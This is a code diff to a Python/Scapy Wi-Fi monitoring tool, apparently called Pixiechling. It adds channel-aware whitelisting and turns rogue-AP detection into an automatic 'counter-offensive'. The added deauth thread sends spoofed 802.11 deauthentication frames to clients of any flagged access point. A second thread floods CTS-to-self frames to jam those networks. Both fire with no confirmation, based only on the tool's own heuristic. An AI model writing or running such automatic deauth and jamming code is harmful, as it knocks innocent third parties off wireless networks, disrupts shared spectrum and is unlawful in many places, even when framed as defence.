@@ -102,21 +102,28 @@ def check_interface(iface):
 
 
 def load_whitelist():
-    """Load whitelist. Supports both formats:
-    - New: {bssid: ssid, ...}  (dict)
-    - Old: [bssid, ...]        (list, no SSID info)"""
+    """Load whitelist. Supports multiple formats:
+    - New: {bssid: {"ssid": ..., "channel": ...}}  (dict of dicts)
+    - Mid: {bssid: ssid, ...}                       (dict of strings)
+    - Old: [bssid, ...]                              (list)"""
     if not os.path.isfile(WHITELIST_FILE):
         return {}
     with open(WHITELIST_FILE, "r") as f:
         data = json.load(f)
     if isinstance(data, list):
-        # Backward compat: convert list to dict with unknown SSIDs
-        return {b: "<unknown>" for b in data}
-    return data
+        return {b: {"ssid": "<unknown>", "channel": None} for b in data}
+    # Check if values are dicts (new format) or strings (mid format)
+    result = {}
+    for bssid, val in data.items():
+        if isinstance(val, dict):
+            result[bssid] = val
+        else:
+            result[bssid] = {"ssid": val, "channel": None}
+    return result
 
 
 def save_whitelist(whitelist):
-    """Save whitelist as {bssid: ssid} dict."""
+    """Save whitelist as {bssid: {"ssid": ..., "channel": ...}} dict."""
     with open(WHITELIST_FILE, "w") as f:
         json.dump(whitelist, f, indent=2)
 
@@ -126,9 +133,10 @@ def save_whitelist(whitelist):
 # ──────────────────────────────────────────────
 
 def scan_bssids(capture_iface, scan_time=30, use_5ghz=False):
-    """Scan channels and collect unique BSSIDs with their SSIDs."""
+    """Scan channels and collect unique BSSIDs with their SSIDs and channels."""
     channels = CHANNELS_24 + CHANNELS_5 if use_5ghz else CHANNELS_24
-    discovered = {}
+    discovered = {}  # bssid -> {"ssid": str, "channel": int}
+    current_ch = [1]
 
     def _handle_beacon(pkt):
         if pkt.haslayer(Dot11Beacon):
@@ -140,12 +148,13 @@ def scan_bssids(capture_iface, scan_time=30, use_5ghz=False):
             if not ssid:
                 ssid = "<hidden>"
             if bssid not in discovered:
-                discovered[bssid] = ssid
+                discovered[bssid] = {"ssid": ssid, "channel": current_ch[0]}
 
     per_channel = max(1, scan_time / len(channels))
     band = "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz"
     print(colored("[*] Scanning BSSIDs on {} ({} ch, {} s) ...".format(band, len(channels), scan_time), "cyan"))
     for ch in channels:
+        current_ch[0] = ch
         subprocess.run(["iwconfig", capture_iface, "channel", str(ch)], check=False)
         sniff(iface=capture_iface, count=10, timeout=per_channel, prn=_handle_beacon)
 
@@ -161,11 +170,11 @@ def mode_scan_whitelist(capture_iface, scan_time=30, use_5ghz=False):
         return
 
     # Display table
-    bssid_list = sorted(discovered.items(), key=lambda x: x[1])
-    print("\n" + colored(" #   BSSID               SSID", "yellow"))
-    print(colored(" " + "-" * 50, "yellow"))
-    for idx, (bssid, ssid) in enumerate(bssid_list, start=1):
-        print(" {:<4} {}   {}".format(idx, bssid, ssid))
+    bssid_list = sorted(discovered.items(), key=lambda x: x[1]["ssid"])
+    print("\n" + colored(" #   BSSID               SSID                    CH", "yellow"))
+    print(colored(" " + "-" * 60, "yellow"))
+    for idx, (bssid, info) in enumerate(bssid_list, start=1):
+        print(" {:<4} {}   {:<24} {}".format(idx, bssid, info["ssid"], info["channel"]))
 
     print()
     print(colored("[?] Enter BSSID numbers to whitelist (comma-separated), or 'all':", "cyan"))
@@ -190,12 +199,13 @@ def mode_scan_whitelist(capture_iface, scan_time=30, use_5ghz=False):
         print(colored("[!] No valid BSSIDs selected.", "red"))
         return
 
-    # Save as {bssid: ssid} mapping
-    whitelist_dict = {b: discovered.get(b, "<unknown>") for b in chosen}
+    # Save as {bssid: {"ssid": ..., "channel": ...}} mapping
+    whitelist_dict = {b: discovered[b] for b in chosen}
     save_whitelist(whitelist_dict)
     print(colored("[+] Whitelist saved ({} BSSIDs):".format(len(chosen)), "green"))
     for b in chosen:
-        print("    {} ({})".format(b, discovered.get(b, "<unknown>")))
+        info = discovered[b]
+        print("    {} ({}) ch={}".format(b, info["ssid"], info["channel"]))
 
 
 # ──────────────────────────────────────────────
@@ -256,8 +266,8 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
     signal.signal(signal.SIGINT, _on_sigint)
 
     print(colored("[+] Whitelist loaded ({} BSSIDs) \u2014 these will be EXCLUDED:".format(len(whitelist)), "green"))
-    for b, s in whitelist.items():
-        print("    {} ({})".format(b, s))
+    for b, info in whitelist.items():
+        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
     print(colored("[*] Capture iface : " + capture_iface, "cyan"))
     print(colored("[*] Replay  iface : " + replay_iface, "cyan"))
     print(colored("[*] Channels      : {} ({} ch)".format(
@@ -496,11 +506,15 @@ def mode_replay(capture_iface, replay_iface, use_5ghz=False):
 #  Mode 3 : Rogue AP detection
 # ──────────────────────────────────────────────
 
-def mode_rogue_detect(capture_iface):
+def mode_rogue_detect(capture_iface, replay_iface, use_5ghz=False):
     """Monitor for rogue APs:
     - SSID spoofing: another BSSID broadcasts the same SSID as a whitelisted AP
+      → immediate counter-offensive: deauth + CTS-to-self latency injection
     - BSSID cloning: same BSSID seen from different signal/channel than expected
+    - Relay/repeater detection
     """
+
+    channels = CHANNELS_24 + CHANNELS_5 if use_5ghz else CHANNELS_24
 
     whitelist = load_whitelist()
     if not whitelist:
@@ -510,21 +524,29 @@ def mode_rogue_detect(capture_iface):
     # Build lookup structures
     wl_bssids = set(b.lower() for b in whitelist.keys())
     wl_ssids = {}  # ssid -> set of legitimate bssids
-    for bssid, ssid in whitelist.items():
+    wl_channels = {}  # bssid -> expected channel (from whitelist)
+    for bssid, info in whitelist.items():
+        ssid = info["ssid"]
         ssid_lower = ssid.lower()
         if ssid_lower not in wl_ssids:
             wl_ssids[ssid_lower] = set()
         wl_ssids[ssid_lower].add(bssid.lower())
+        if info.get("channel") is not None:
+            wl_channels[bssid.lower()] = info["channel"]
 
     # Track what we've already alerted on to avoid spam
     alerted_spoof = set()   # (rogue_bssid, ssid)
     alerted_clone = set()   # (bssid, channel)
-    # Track first-seen channel per BSSID for clone detection
+    # Track first-seen channel per BSSID for clone detection (fallback)
     bssid_channels = {}     # bssid -> first_seen_channel
     # Relay/repeater tracking
     beacon_bssids = {}      # bssid -> ssid (all BSSIDs seen in beacons)
     relays = {}             # relay_bssid -> {upstream_bssid: upstream_ssid}
     alerted_relay = set()   # (relay_bssid, upstream_bssid)
+    # Counter-offensive: track rogue spoof BSSIDs and their clients
+    rogue_bssids = set()    # BSSIDs detected as SSID spoofers
+    rogue_clients = {}      # rogue_bssid -> {"ssid": str, "clients": set()}
+    rogue_lock = threading.Lock()
     lock = threading.Lock()
     stop_event = threading.Event()
 
@@ -535,10 +557,13 @@ def mode_rogue_detect(capture_iface):
     signal.signal(signal.SIGINT, _on_sigint)
 
     print(colored("[+] Whitelist loaded ({} BSSIDs):".format(len(whitelist)), "green"))
-    for b, s in whitelist.items():
-        print("    {} ({})".format(b, s))
+    for b, info in whitelist.items():
+        print("    {} ({}) ch={}".format(b, info["ssid"], info.get("channel", "?")))
     print(colored("[*] Protected SSIDs: {}".format(
         ", ".join(s for s in wl_ssids.keys() if s != "<unknown>")), "cyan"))
+    print(colored("[*] Channels      : {} ({} ch)".format(
+        "2.4 GHz + 5 GHz" if use_5ghz else "2.4 GHz only", len(channels)), "cyan"))
+    print(colored("[*] Replay iface  : {} (counter-offensive on SSID spoof + evil twin)".format(replay_iface), "cyan"))
     print(colored("[*] Monitoring for rogue APs + signal relays (Ctrl+C to stop) ...", "cyan"))
     print()
 
@@ -582,6 +607,7 @@ def mode_rogue_detect(capture_iface):
                     alert_key = (bssid, ssid_lower)
                     if alert_key not in alerted_spoof:
                         alerted_spoof.add(alert_key)
+                        rogue_bssids.add(bssid)
                         legit = ", ".join(wl_ssids[ssid_lower])
                         print(colored(
                             "\n  [!!!] SSID SPOOFING DETECTED", "red", attrs=["bold", "reverse"]))
@@ -595,17 +621,23 @@ def mode_rogue_detect(capture_iface):
                             "        Channel     : {}".format(ch), "yellow"))
                         print(colored(
                             "        Time        : {}".format(time.strftime("%c")), "yellow"))
+                        print(colored(
+                            "        [>>>] COUNTER-OFFENSIVE ENGAGED", "red", attrs=["bold"]))
                         print()
-
-                # ── Check 2: BSSID cloning ──
+                # \u2500\u2500 Check 2: BSSID cloning \u2500\u2500
                 if bssid in wl_bssids:
-                    if bssid not in bssid_channels:
-                        bssid_channels[bssid] = ch
-                    elif bssid_channels[bssid] != ch:
+                    expected_ch = wl_channels.get(bssid)
+                    if expected_ch is None:
+                        # Fallback: use first-seen channel
+                        if bssid not in bssid_channels:
+                            bssid_channels[bssid] = ch
+                        expected_ch = bssid_channels[bssid]
+                    if ch != expected_ch:
                         alert_key = (bssid, ch)
                         if alert_key not in alerted_clone:
                             alerted_clone.add(alert_key)
-                            expected_ch = bssid_channels[bssid]
+                            # Add to rogue targets for counter-offensive
+                            rogue_bssids.add(bssid)
                             print(colored(
                                 "\n  [!!!] BSSID CLONE / EVIL TWIN DETECTED", "red", attrs=["bold", "reverse"]))
                             print(colored(
@@ -618,14 +650,51 @@ def mode_rogue_detect(capture_iface):
                                 "        Seen on ch  : {}".format(ch), "red", attrs=["bold"]))
                             print(colored(
                                 "        Time        : {}".format(time.strftime("%c")), "yellow"))
+                            print(colored(
+                                "        [>>>] COUNTER-OFFENSIVE ENGAGED", "red", attrs=["bold"]))
                             print()
 
-        # ── Data frame processing: relay/repeater detection ──
+        # ── Data frame processing: relay/repeater detection + rogue client tracking ──
         if pkt.haslayer(Dot11):
             dot11 = pkt.getlayer(Dot11)
-            if dot11.type == 2:  # Data frame
-                addr1 = (dot11.addr1 or "").lower()
-                addr2 = (dot11.addr2 or "").lower()
+
+            # ── Client tracking for rogue spoof BSSIDs ──
+            addr1 = (dot11.addr1 or "").lower()
+            addr2 = (dot11.addr2 or "").lower()
+            addr3 = (dot11.addr3 or "").lower()
+
+            with lock:
+                target_bssid = None
+                client_mac = None
+                # Check if any address is a rogue BSSID
+                if addr3 in rogue_bssids and addr3 != "ff:ff:ff:ff:ff:ff":
+                    target_bssid = addr3
+                    if addr2 != target_bssid:
+                        client_mac = addr2
+                    elif addr1 != target_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
+                        client_mac = addr1
+                elif addr2 in rogue_bssids:
+                    target_bssid = addr2
+                    if addr1 != target_bssid and addr1 != "ff:ff:ff:ff:ff:ff":
+                        client_mac = addr1
+
+                if target_bssid and client_mac and client_mac != "ff:ff:ff:ff:ff:ff":
+                    with rogue_lock:
+                        if target_bssid not in rogue_clients:
+                            rogue_clients[target_bssid] = {
+                                "ssid": beacon_bssids.get(target_bssid, "<unknown>"),
+                                "clients": set(),
+                            }
+                        if client_mac not in rogue_clients[target_bssid]["clients"]:
+                            rogue_clients[target_bssid]["clients"].add(client_mac)
+                            r_ssid = rogue_clients[target_bssid]["ssid"]
+                            print(colored("  [+] Rogue client: ", "red") +
+                                  colored(client_mac, "white") +
+                                  colored(" → ", "yellow") +
+                                  colored("{} ({})".format(target_bssid, r_ssid), "red"))
+
+            # ── Relay/repeater detection (data frames only) ──
+            if dot11.type == 2:
                 ds_bits = dot11.FCfield & 0x3
 
                 with lock:
@@ -678,7 +747,7 @@ def mode_rogue_detect(capture_iface):
     # ── Capture thread ──
     def capture_loop():
         while not stop_event.is_set():
-            for ch in range(1, 14):
+            for ch in channels:
                 if stop_event.is_set():
                     return
                 current_channel[0] = ch
@@ -693,6 +762,70 @@ def mode_rogue_detect(capture_iface):
     cap_thread = threading.Thread(target=capture_loop, daemon=True)
     cap_thread.start()
 
+    # ── Deauth thread (counter-offensive on rogue spoof BSSIDs) ──
+    def deauth_loop():
+        """Continuously deauth clients from rogue BSSIDs (SSID spoof + evil twin)."""
+        while not stop_event.is_set():
+            with rogue_lock:
+                targets = [
+                    (bssid, list(info["clients"]))
+                    for bssid, info in rogue_clients.items()
+                    if info["clients"]
+                ]
+            if not targets:
+                time.sleep(2)
+                continue
+
+            for bssid, clients in targets:
+                if stop_event.is_set():
+                    return
+                for client in clients:
+                    if stop_event.is_set():
+                        return
+                    deauth_ap = RadioTap() / Dot11(
+                        addr1=client, addr2=bssid, addr3=bssid
+                    ) / Dot11Deauth(reason=7)
+                    deauth_cl = RadioTap() / Dot11(
+                        addr1=bssid, addr2=client, addr3=bssid
+                    ) / Dot11Deauth(reason=7)
+                    try:
+                        sendp(deauth_ap, iface=replay_iface, count=3, inter=0.02, verbose=False)
+                        sendp(deauth_cl, iface=replay_iface, count=3, inter=0.02, verbose=False)
+                    except Exception:
+                        pass
+            time.sleep(1)
+
+    deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
+    deauth_thread.start()
+
+    # ── Latency injection thread (CTS-to-self on rogue spoof BSSIDs) ──
+    def latency_loop():
+        """Flood CTS-to-self frames spoofed from rogue BSSIDs to inject
+        latency into their client communications."""
+        while not stop_event.is_set():
+            with lock:
+                targets = list(rogue_bssids)
+            if not targets:
+                time.sleep(2)
+                continue
+
+            for bssid in targets:
+                if stop_event.is_set():
+                    return
+                cts = RadioTap() / Dot11(
+                    type=1, subtype=12,
+                    addr1=bssid,
+                    ID=30000,
+                )
+                try:
+                    sendp(cts, iface=replay_iface, count=5, inter=0.01, verbose=False)
+                except Exception:
+                    pass
+            time.sleep(0.5)
+
+    latency_thread = threading.Thread(target=latency_loop, daemon=True)
+    latency_thread.start()
+
     # ── Summary loop (main thread) ──
     while not stop_event.is_set():
         time.sleep(15)
@@ -703,11 +836,29 @@ def mode_rogue_detect(capture_iface):
             relay_snapshot = {r: dict(u) for r, u in relays.items()}
             bssid_names = dict(beacon_bssids)
         total_alerts = spoof_count + clone_count + relay_count
+        with rogue_lock:
+            rogue_count = len(rogue_bssids)
+            rogue_client_count = sum(len(v["clients"]) for v in rogue_clients.values())
+            rogue_snapshot = {
+                b: {"ssid": info["ssid"], "clients": list(info["clients"])}
+                for b, info in rogue_clients.items()
+            }
         print(colored(
             "\n[*] Status: {} SSID spoof(s), {} BSSID clone(s), {} relay(s) detected".format(
                 spoof_count, clone_count, relay_count),
             "yellow" if total_alerts == 0 else "red",
         ))
+        if rogue_count:
+            print(colored(
+                "[*] Counter-offensive: {} rogue AP(s), {} client(s) under deauth + latency".format(
+                    rogue_count, rogue_client_count),
+                "red", attrs=["bold"],
+            ))
+            for r_bssid, info in sorted(rogue_snapshot.items()):
+                print(colored("    Rogue AP {} ({})".format(r_bssid, info["ssid"]), "red") +
+                      colored(" — {} client(s)".format(len(info["clients"])), "white"))
+                for c in sorted(info["clients"]):
+                    print("        └─ " + c)
         if relay_snapshot:
             print(colored("  Relay network map:", "magenta", attrs=["bold"]))
             for r_bssid, upstreams in sorted(relay_snapshot.items()):
@@ -718,6 +869,8 @@ def mode_rogue_detect(capture_iface):
                             r_bssid, r_ssid, u_bssid, u_ssid), "magenta"))
 
     cap_thread.join(timeout=5)
+    deauth_thread.join(timeout=3)
+    latency_thread.join(timeout=3)
     print(colored("[*] Pixiechling stopped.", "yellow"))
 
 
@@ -754,7 +907,7 @@ if __name__ == "__main__":
         action="store_true",
         default=False,
         dest="use_5ghz",
-        help="Include 5 GHz channels (36-165) in mode 2 capture/replay",
+        help="Include 5 GHz channels (36-165) in modes 1, 2 and 3",
     )
     args = parser.parse_args()
 
@@ -775,4 +928,5 @@ if __name__ == "__main__":
         mode_replay(capture_iface, replay_iface, args.use_5ghz)
     elif args.mode == "3":
         check_interface(capture_iface)
-        mode_rogue_detect(capture_iface)
+        check_interface(replay_iface)
+        mode_rogue_detect(capture_iface, replay_iface, args.use_5ghz)
